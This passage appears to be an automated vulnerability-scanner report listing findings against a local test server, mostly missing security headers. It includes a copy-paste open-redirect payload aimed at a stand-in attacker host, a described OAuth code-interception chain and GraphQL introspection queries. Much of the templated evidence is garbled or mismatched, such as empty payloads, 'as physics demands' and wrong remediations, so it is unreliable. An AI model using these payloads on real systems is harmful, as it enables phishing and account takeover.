All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Set Secure, HttpOnly and SameSite=Lax/Strict on session cookies.

### 33. [MEDIUM] Missing Content-Security-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-693
- **Module:** security-headers

**Description.** No CSP header. CSP is a key defense-in-depth control against XSS and data injection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'content-security-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Define a restrictive Content-Security-Policy (e.g. default-src 'self').

### 34. [MEDIUM] Missing HSTS (Strict-Transport-Security)

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-319
- **Module:** security-headers

**Description.** No HSTS header, so browsers may downgrade to HTTP and are exposed to SSL-strip attacks.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'strict-transport-security'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Strict-Transport-Security: max-age=63072000; includeSubDomains; preload over HTTPS.

### 35. [MEDIUM] Page can be framed (clickjacking)

- **Class:** Clickjacking
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-1021
- **Module:** security-headers

**Description.** Neither X-Frame-Options nor a CSP frame-ancestors directive is set, so the page can be embedded in a hostile iframe for clickjacking.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
No X-Frame-Options header and no frame-ancestors in CSP.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Set X-Frame-Options: DENY (or SAMEORIGIN) and/or CSP frame-ancestors 'none'.

### 36. [MEDIUM] Exposed source map: http://127.0.0.1:8081/static/app.js.map

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/static/app.js.map
- **Injection point:** `GET /static/app.js.map`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-540
- **Module:** sourcemap-exposure

**Description.** The minified JavaScript file http://127.0.0.1:8081/static/app.js ships a sourceMappingURL comment and the .map file is publicly accessible. This leaks the original (un-minified) source code, file paths, and sometimes inline secrets or API keys not stripped from the original source.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
sourcesCount=2; sample sources: ../src/app.js, ../src/internal.js
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable sourcemap generation in production builds, or serve .map files only on an internal / authenticated path.

### 37. [MEDIUM] HTTP not redirected to HTTPS

- **Class:** TLS / Transport Security
- **URL:** http://127.0.0.1/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-319
- **Module:** tls

**Description.** Plain HTTP is served without redirecting to HTTPS; traffic can be intercepted.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1/ -> 0, Location: none
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Redirect all HTTP to HTTPS and enable HSTS.

### 38. [MEDIUM] GraphQL introspection enabled (6 types disclosed)

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/graphql
- **Injection point:** `POST /graphql`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** graphql-hunter

**Description.** The GraphQL schema is fully introspectable: object types, fields and relationships are disclosed, giving an attacker a complete API map and letting them target undocumented or admin-only operations.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
introspection returned 6 types incl. Mutation, Query, Role, Session, User

POST http://127.0.0.1:8081/graphql (application/json) body: {"query": "{ __schema { types { name } queryType { name } } }"}
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable introspection in production, silence field suggestions, and gate GraphQL operations with depth/complexity limits and authz rules.

### 39. [MEDIUM] Open redirect via 'url'

- **Class:** Open Redirect
- **URL:** http://127.0.0.1:8081/go
- **Injection point:** `GET /go -> request parameter 'url'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-601
- **Module:** open-redirect

**Description.** 'url' redirects to an attacker-controlled external URL.

#### Vulnerable code location

**Reconstructed sink (black-box evidence).** The application's source code was not available to this scan, so the vulnerable code pattern below was reconstructed from observed behaviour -- the input provably reaches a sink of this shape at the listed injection point (see the detection evidence and raw exchange for the proof).

```text
# Reconstructed from behaviour: the parameter is used verbatim as the
# redirect target, so absolute URLs send users off-site.
return redirect(request_input)   # Location: attacker-controlled
```

**Impact.** Your domain is weaponised for phishing: links, emails and QR codes that point to your trusted origin silently land users on attacker infrastructure. In OAuth/OIDC flows an open redirect_uri leaks authorization codes and tokens directly to attackers.

**Detection evidence.**

```
Set url=https://bughound-evil.example/ -> Location/final: https://bughound-evil.example/

GET http://127.0.0.1:8081/go (url=https://bughound-evil.example/)
```

#### Proof of exploitation

The scanner verified the end-to-end redirect flow: a victim clicking the crafted link is sent from your trusted origin to https://bughound-evil.example/ (requests followed for documentation only).

**Data extracted from the target by the exploit:**

```
1.  HTTP 307 -> Location: https://bughound-evil.example/
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'url=https://bughound-evil.example/' 'http://127.0.0.1:8081/go'
```

**Raw HTTP exchange:**

```http
GET /go?url=https%3A%2F%2Fbughound-evil.example%2F HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 307

date: Mon, 12 Oct 2026 12:41:34 GMT
server: uvicorn
content-length: 0
location: https://bughound-evil.example/


```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/go in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: https://bughound-evil.example/
4. Observe that the browser is redirected off your domain to the attacker URL.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Redirect only to allowlisted relative paths; reject absolute external URLs.

### 40. [MEDIUM] POST form without anti-CSRF token

- **Class:** Cross-Site Request Forgery (CSRF)
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** confidence: tentative (exploit attempted)
- **CWE:** CWE-352
- **Module:** advisory

**Description.** A state-changing form has no visible CSRF token; verify CSRF protection.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
<form action='/transfer' method=post> has no token field.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Add per-session/per-request CSRF tokens or use SameSite cookies + origin checks.

### 41. [MEDIUM] Chained: open redirect adjacent to OAuth flow -> authorization-code interception

- **Class:** OAuth / SAML Misconfiguration
- **URL:** http://127.0.0.1:8081/go
- **Injection point:** `GET /go`
- **Status:** confidence: tentative (exploit attempted)
- **Module:** exploit-chainer
- **Attack chain:** `redirect-to-oauth` -- composed from 1 finding(s)

**Chain narrative.** Open redirect via 'url' -> Chained: open redirect adjacent to OAuth flow -> authorization-code interception

**Description.** An open redirect exists on this site and OAuth/SSO endpoints (http://127.0.0.1:8081/filter?category=Accessories) were discovered in the crawl. Where the identity provider's redirect allowlist includes this site (common for first-party domains), the open redirect becomes an open redirector for authorization codes: a crafted login link bounces the victim's OAuth code to the attacker's server.

**Impact.** Authorization codes (and with loose PKCE, tokens) can be intercepted by chaining the open redirect into the OAuth return path, yielding full account takeover of victims who click a crafted login link.

**Detection evidence.**

```
1) open redirect: Set url=https://bughound-evil.example/ -> Location/final: https://bughound-evil.example/
2) OAuth/SSO endpoints in scope: http://127.0.0.1:8081/filter?category=Accessories
```

#### Exploit phase result

Attack chain assembled from independently verified findings: Open redirect via 'url'. Every link's raw evidence appears in its parent finding's report section; this finding carries the combined impact.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove the open redirect; enforce exact-match redirect allowlists at the identity provider; require PKCE (S256) and state on every flow.

### 42. [LOW] Missing X-Content-Type-Options: nosniff

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-16
- **Module:** security-headers

**Description.** Without nosniff, browsers may MIME-sniff responses, enabling some XSS vectors.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'x-content-type-options'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send X-Content-Type-Options: nosniff.

### 43. [LOW] Missing Permissions-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-732
- **Module:** security-headers

**Description.** No Permissions-Policy; the page (or any iframe embedding it) can use powerful browser features (camera, microphone, geolocation, payment, USB) by default.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'permissions-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=().

### 44. [LOW] Missing Cache-Control

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-525
- **Module:** security-headers

**Description.** No Cache-Control header; sensitive responses may be cached by shared proxies or the browser, enabling access after logout / on shared devices.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'cache-control'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Send Cache-Control: no-store (or no-cache, must-revalidate) for authenticated and sensitive responses.

### 45. [LOW] GraphQL introspection also allowed over GET

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/graphql
- **Injection point:** `GET /graphql`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-16
- **Module:** graphql-hunter

**Description.** Introspection succeeds over plain GET, so full schema URLs can leak into browser history, proxy logs and Referer headers.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/graphql?query={"query": "{ __schema { types { name } queryType { name } } ... returned __schema
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Disable introspection in production, silence field suggestions, and gate GraphQL operations with depth/complexity limits and authz rules.

### 46. [INFO] Harvested 1 email address(es) from client content

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **CWE:** CWE-200
- **Module:** email-harvest

**Description.** Email addresses were found in HTML and / or same-origin JavaScript files. These are useful for OSINT, phishing simulation, username enumeration, and may also indicate internal naming conventions.

**Detection evidence.**

```
admin@example.com
```

**Remediation.** Avoid publishing individual email addresses in client content; prefer a contact form or shared inbox.

### 47. [INFO] Server advertises 6 HTTP method(s): GET, POST, OPTIONS, PUT, DELETE, TRACE

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **Module:** http-methods

**Description.** An OPTIONS request returned an Allow / Public header listing the HTTP methods the server accepts. This shapes which active tests are worth running.

**Detection evidence.**

```
OPTIONS http://127.0.0.1:8081/ -> Allow: GET, POST, OPTIONS, PUT, DELETE, TRACE
```

**Remediation.** Restrict the Allow header to methods the application actually uses.

### 48. [INFO] Technology disclosed via 'server' header

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET / -> request parameter 'server'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** info-disclosure

**Description.** The 'server' header reveals server/framework details useful to an attacker.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
server: uvicorn, nginx/1.18.0 (Ubuntu)
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove or obfuscate the 'server' response header.

### 49. [INFO] Technology disclosed via 'x-powered-by' header

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET / -> request parameter 'x-powered-by'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** info-disclosure

**Description.** The 'x-powered-by' header reveals server/framework details useful to an attacker.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
x-powered-by: Express
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Remove or obfuscate the 'x-powered-by' response header.

### 50. [INFO] security.txt (informational)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/.well-known/security.txt
- **Injection point:** `GET /.well-known/security.txt`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-538
- **Module:** info-disclosure

**Description.** A sensitive resource is publicly accessible at .well-known/security.txt.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
GET http://127.0.0.1:8081/.well-known/security.txt -> 200; body starts: 'Contact: mailto:security@example.com\nExpires: 2026-12-31T23:59:59Z\n'
```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Block access to VCS/backup/config files at the web server and remove them from webroot.

### 51. [INFO] Extracted 3 endpoint path(s) from 1 JS file(s)

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED
- **CWE:** CWE-200
- **Module:** js-endpoints

**Description.** Same-origin JavaScript files reference API / internal paths that are not linked from HTML. These are valuable targets for the active phase: many contain unauthenticated endpoints, debug routes, or admin functionality.

**Detection evidence.**

```
/api/internal/health
/api/v1/orders
/api/v1/users
```

**Remediation.** Minify and remove inline API references; serve debug builds only on internal environments.

### 52. [INFO] robots.txt discloses 2 hidden path(s)

- **Class:** Reconnaissance / Attack-Surface Mapping
- **URL:** http://127.0.0.1:8081/robots.txt
- **Injection point:** `GET /robots.txt`
- **Status:** VERIFIED
- **Module:** robots-sitemap

**Description.** robots.txt explicitly lists paths the operator wants hidden from crawlers -- these are prime targets for further testing since 'hidden' often implies sensitive.

**Detection evidence.**

```
/admin
/private
```

**Remediation.** Do not rely on robots.txt to enforce access control; ensure hidden paths are protected server-side.

### 53. [INFO] security.txt published (RFC 9116)

- **Class:** Information Disclosure / Source Exposure
- **URL:** http://127.0.0.1:8081/.well-known/security.txt
- **Injection point:** `GET /.well-known/security.txt`
- **Status:** VERIFIED (exploit attempted)
- **Module:** robots-sitemap

**Description.** A security.txt file is published, disclosing the vulnerability disclosure policy and security contact (mailto:security@example.com).

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z

```

#### False-positive analysis

All 1 false-positive checks passed (evidence-captured): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the this finding behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| evidence-captured | PASS | the finding carries captured request/response evidence (not just a heuristic label) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Keep security.txt up to date and verify the listed contact.

**References.** https://www.rfc-editor.org/rfc/rfc9116.html

### 54. [INFO] Missing Referrer-Policy

- **Class:** Security Misconfiguration
- **URL:** http://127.0.0.1:8081/
- **Injection point:** `GET /`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-200
- **Module:** security-headers

**Description.** No Referrer-Policy; referrer URLs may leak to third parties.

**Impact.** Exploitation by an attacker would compromise the confidentiality, integrity or availability of the application and its data. Review the evidence and remediation guidance, and retest after the fix is deployed.

**Detection evidence.**

```
Response headers did not include 'referrer-policy'.
```

#### Proof of exploitation

**Reproduce (copy-paste):**

```bash
curl -sS -i -G 'http://127.0.0.1:8081/'
```

**Raw HTTP exchange:**

```http
GET / HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 
4. Observe that the evidence described above appears in the response.

#### False-positive analysis

